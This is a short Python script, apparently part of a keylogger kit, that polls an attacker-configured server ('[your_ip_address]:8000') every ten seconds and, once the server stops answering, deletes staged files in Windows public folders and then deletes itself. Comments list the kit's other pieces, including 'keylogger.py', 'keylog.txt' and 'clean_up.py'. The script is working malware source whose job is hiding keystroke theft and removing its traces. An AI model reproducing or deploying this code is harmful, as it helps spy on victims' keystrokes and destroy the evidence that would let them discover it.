import os, requests, time


def checker():
    try:
        requests.post("http://[your_ip_address]:8000/checker", data={"data": "check"})
        time.sleep(10)
        checker()
    except Exception as e:
        os.remove(r"C:\Users\Public\Pictures\uffh.txt")
        os.remove(r"C:\Users\Public\Music\djsw.py")
        os.remove(__file__)

time.sleep(10)
checker()

# r"C:\Users\Public\Pictures\keylog.txt"
# r"C:\Users\Public\Videos\clean_up.py"
# r"C:\Users\Public\Music\keylogger.py"